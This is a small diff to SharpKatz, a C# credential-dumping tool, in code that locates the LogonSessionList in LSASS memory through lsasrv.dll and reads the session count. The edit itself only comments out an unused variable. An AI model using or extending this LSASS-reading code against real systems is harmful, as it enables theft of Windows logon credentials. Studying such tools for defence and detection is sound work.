@@ -51,7 +51,7 @@ namespace SharpKatz.Module
         {
 
             uint logonSessionListSignOffset;
-            IntPtr logonSessionListAddr;
+            //IntPtr logonSessionListAddr;
             int logonSessionListCount; //*DWORD
 
             // Search for LogonSessionList signature within lsasrv.dll and grab the offset
@@ -63,7 +63,7 @@ namespace SharpKatz.Module
             }
             //Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);
 
-            logonSessionListAddr = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET);
+            //logonSessionListAddr = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET);
             logonSessionListCount = Utility.GetInt(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONSLISTCOUNTOFFSET);
 
             //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
